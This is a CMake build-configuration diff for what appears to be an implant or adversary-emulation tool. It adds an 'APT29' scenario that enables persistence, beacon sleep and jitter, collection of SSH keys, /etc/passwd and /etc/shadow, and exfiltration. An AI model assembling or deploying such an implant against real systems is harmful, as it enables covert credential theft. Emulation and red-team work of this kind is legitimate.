@@ -80,11 +80,13 @@ elseif(SCENARIO_MODE STREQUAL "INFOSTEALER")
     add_compile_definitions(SCENARIO_INFOSTEALER)
     set(ENABLE_PERSISTENCE OFF)
     set(ENABLE_IMPACT OFF)
+
     set(ENABLE_GATHER ON)
     set(GATHER_SYSINFO OFF)
     set(GATHER_SSH ON)
     set(GATHER_ETCPASSWD ON)
     set(GATHER_ETCSHADOW ON)
+
     set(ENABLE_EXFIL ON)
 elseif(SCENARIO_MODE STREQUAL "APT")
     add_compile_definitions(SCENARIO_APT)
@@ -96,9 +98,29 @@ elseif(SCENARIO_MODE STREQUAL "APT")
     set(PERSIST_RUNCONTROL ON)
     set(PERSIST_SERVICE OFF)
     set(PERSIST_CRON OFF)
+
     set(ENABLE_IMPACT OFF)
     set(ENABLE_GATHER OFF)
     set(ENABLE_EXFIL OFF)
+elseif(SCENARIO_MODE STREQUAL "APT29")
+    add_compile_definitions(SCENARIO_APT29)
+
+    add_compile_definitions(GHOST_SLEEP_SEC=14400)
+    add_compile_definitions(GHOST_JITTER_PERCENT=40)
+
+    set(ENABLE_PERSISTENCE ON)
+    set(PERSIST_RUNCONTROL ON)
+    set(PERSIST_SERVICE OFF)
+    set(PERSIST_CRON OFF)
+
+    set(ENABLE_GATHER ON)
+    set(GATHER_SYSINFO OFF)
+    set(GATHER_SSH ON)
+    set(GATHER_ETCPASSWD ON)
+    set(GATHER_ETCSHADOW ON)
+
+    set(ENABLE_EXFIL ON)
+    set(ENABLE_IMPACT OFF)
 endif()
 
 # ==========================================
